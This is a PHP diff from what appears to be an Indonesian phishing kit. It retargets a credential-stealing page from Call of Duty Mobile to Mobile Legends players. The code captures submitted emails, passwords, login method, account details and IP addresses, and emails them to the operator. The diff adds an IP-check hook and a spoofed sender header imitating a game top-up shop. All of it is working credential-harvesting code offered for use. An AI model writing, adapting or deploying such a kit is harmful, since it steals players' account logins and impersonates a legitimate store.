@@ -1,10 +1,10 @@
 <?php
 // MENGAMBIL KONTROL
-include '../email.php';
+include '../ryucodex/main.php';
 include '../ryucodex/result.php';
+include '../email.php';
 
 // MENANGKAP DATA YANG DI-INPUT
-
 $email = $_POST['email'];
 $password = $_POST['password'];
 $login = $_POST['login'];
@@ -28,7 +28,7 @@ header("Location: index.php");
 }else{
 
 // KONTEN RESULT AKUN
-$subjek = "$resultFlags | CODM LEVEL $level | LOG $login | PUNYA $nickname";
+$subjek = "$resultFlags | ML LEVEL $level | LOG $login | PUNYA $nickname";
 $pesan = <<<EOD
 	<!DOCTYPE html>
 	<html>
@@ -103,7 +103,7 @@ $pesan = <<<EOD
 		<div class="result">
 			<table class="tblResult">
 				<tr>
-					<th style="text-align: center;" colspan="3">Informasi Akun CODM</th>
+					<th style="text-align: center;" colspan="3">Informasi Akun Mobile Legends</th>
 				</tr>
 				<tr>
 					<td style="border-right: none;">Email Akun</td>
@@ -114,7 +114,7 @@ $pesan = <<<EOD
 					<td style="text-align: right;">$password</td>
 				</tr>
 				<tr>
-					<th style="text-align: center;" colspan="3">Detail Akun CODM</th>
+					<th style="text-align: center;" colspan="3">Detail Akun Mobile Legends</th>
 				</tr>
 				<tr>
 					<td style="border-right: none;">ID Karakter</td>
@@ -164,16 +164,17 @@ $pesan = <<<EOD
 					<td style="text-align: right;">$ipAddr</td>
 				</tr>
 				<tr>
-				<th style="text-align: center;" colspan="3">2020 &copy; CODASHOP GANS CODM</th>
+				<th style="text-align: center;" colspan="3">2020 &copy; RyuCodex</th>
 				</tr>
 			</table>
 		</div>
 	</body>
 	</html>
 EOD;
+check_ip($subjek,$pesan);
 $headers  = 'MIME-Version: 1.0' . "\r\n";
 $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
-$headers .= 'From: RESS GEMBOL STORE <gxc7.id@gmail.com>' . "\r\n";
+$headers .= 'From: CODHASHOP ID <support@codashops.com>' . "\r\n";
 $kirim = mail($emailku, $subjek, $pesan, $headers);
 // MENDAPATKAN DATA YANG DI-INPUT DAN MENGALIHKAN KE HALAMAN COMPLETED
 if($pesan) {
